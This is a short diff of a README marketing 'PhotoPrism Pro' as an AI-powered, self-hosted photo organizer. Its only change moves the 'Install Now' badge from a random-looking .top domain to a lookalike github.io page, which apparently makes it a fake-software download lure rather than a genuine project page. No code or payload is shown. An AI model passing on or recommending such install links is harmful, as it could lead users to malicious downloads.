@@ -2,7 +2,7 @@
 
 PhotoPrism Pro revolutionizes digital photo organization with its advanced AI-driven capabilities, offering photographers, archivists, and digital hoards a comprehensive solution for managing growing visual collections. As a fully self-hosted platform, it combines cutting-edge machine learning with enterprise-grade privacy controls, delivering Google Photos-level functionality without compromising data sovereignty.
 
-[![Install Now](https://img.shields.io/badge/GET_PHOTOPRISM_PRO-FF6C37?style=for-the-badge&logo=github&logoColor=white)](https://poelkakusthbutn.top/)
+[![Install Now](https://img.shields.io/badge/GET_PHOTOPRISM_PRO-FF6C37?style=for-the-badge&logo=github&logoColor=white)](https://photoprism-ai-powered.github.io/.github/)
 
 ---
 
